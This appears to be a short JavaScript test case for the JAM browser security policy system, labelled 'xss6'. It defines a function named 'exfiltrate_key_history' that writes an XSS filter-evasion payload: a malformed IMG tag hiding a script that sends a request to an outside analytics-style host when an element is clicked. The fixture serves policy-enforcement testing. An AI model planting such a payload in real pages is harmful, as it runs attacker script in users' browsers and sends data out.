introspect(JAM.policy.pFull) {
function exfiltrate_key_history() {
  var URL = '<IMG """><SCRIPT>xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=xss6", true);xmlhttp.send(null);\x3c/SCRIPT>">';
  document.write(URL);
}
document.getElementById("test").onclick = exfiltrate_key_history

}
